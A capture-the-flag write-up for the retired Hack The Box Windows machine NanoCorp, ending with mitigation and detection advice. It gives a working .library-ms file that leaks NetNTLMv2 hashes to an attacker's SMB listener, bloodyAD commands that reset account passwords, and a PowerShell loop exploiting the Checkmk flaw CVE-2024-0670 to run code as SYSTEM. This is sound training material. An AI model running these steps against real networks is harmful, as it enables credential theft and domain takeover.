---
machine: NanoCorp
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, active-directory, ntlm, cve-2025-24071, bloodhound, kerberos, checkmk, privesc]
---

# NanoCorp — Hack The Box (Windows)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The hiring portal `hire.nanocorp.htb` accepts a ZIP CV. A `.library-ms` file with a UNC path makes Windows authenticate to SMB and leaks `web_svc`'s NetNTLMv2 hash. BloodHound shows `web_svc` can add members to `IT_Support`, and that group can reset `monitoring_svc`'s password. Because the account is in Protected Users, only Kerberos works; WinRM over 5986 gives a shell and the Checkmk agent escalates to SYSTEM.

## Recon

```bash
nmap -Pn -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5986,9389 <IP>
```

- Domain controller with DNS, Kerberos, LDAP, SMB and WinRM.
- RDP (3389) listens on the host but is not used; access is over WinRM SSL on `5986`.
- `80` hosts the careers site and `hire.nanocorp.htb` the CV upload.
- The domain is `nanocorp.htb`.

## Enumeration

Register on the portal and upload a ZIP containing a `.library-ms` pointing at `\\<IP>\share`. When processed, the server opens the resource and sends `web_svc`'s NetNTLMv2 hash to a Responder listener. `hashcat -m 5600` cracks it.

```xml
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\<IP>\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

## Foothold

Run BloodHound with `web_svc` credentials. The user can add accounts to `IT_Support`; that group can change `monitoring_svc`'s password. Since `monitoring_svc` belongs to Protected Users, NTLM is blocked and Kerberos is required.

```bash
bloodhound-python -u web_svc -p '<password>' -d nanocorp.htb -ns <IP> -c All
```

## Lateral movement

Add `web_svc` to `IT_Support`, reset `monitoring_svc`'s password, generate a `krb5.conf` and connect with Kerberos. WinRM over SSL on `5986` accepts the session; classic Evil-WinRM does not support this authentication, so `evil-winrm-py` is used.

```bash
bloodyAD --host dc01.nanocorp.htb -u web_svc -p '<password>' add groupMember IT_Support web_svc
bloodyAD --host dc01.nanocorp.htb -u web_svc -p '<password>' set password monitoring_svc '<newpassword>'
netexec smb nanocorp.htb -u web_svc -p '<password>' --generate-krb5-file krb5.conf
evil-winrm-py -i dc01.nanocorp.htb -u monitoring_svc -p '<newpassword>' -k --ssl --port 5986
```

## Privilege escalation

The host runs the Checkmk agent. The version predates 2.2.0p23/2.1.0p40 and is vulnerable to CVE-2024-0670: the agent executes `cmk_all_*_1.cmd` temporary files in `C:\Windows\Temp` as SYSTEM. Seed the expected names as read-only and invoke the installer/MSI so they run.

```powershell
10000..30000 | foreach {
  copy payload.cmd C:\Windows\Temp\cmk_all_${_}_1.cmd
  Set-ItemProperty C:\Windows\Temp\cmk_all_${_}_1.cmd -Name IsReadOnly -Value $true
}
```

## Evidence

- ZIP with `.library-ms` and captured NetNTLMv2 hash.
- BloodHound path from `web_svc` to `IT_Support`.
- `krb5.conf` and WinRM over SSL with Kerberos.
- `cmk_all_*` files executed as SYSTEM.

## Lessons learned

- Document formats can trigger outbound authentication.
- Nested group permissions allow resetting service accounts.
- Protected Users forces Kerberos and blocks NTLM techniques.
- A monitoring agent that executes plugins is a SYSTEM path.

## Mitigation and detection

- Block outbound SMB and apply rules to `.library-ms`/`.searchConnector-ms`.
- Review group ACLs and avoid broad `ForceChangePassword`.
- Update Checkmk and restrict writes to `C:\Windows\Temp`.
- Alert on NTLM authentication from servers and on `cmk_all_*` creation.

## References

- [0xdf — NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [IppSec — NanoCorp](https://www.youtube.com/watch?v=8CjoKTPjbbk)
- [Hack The Box — NanoCorp](https://app.hackthebox.com/machines/nanocorp)
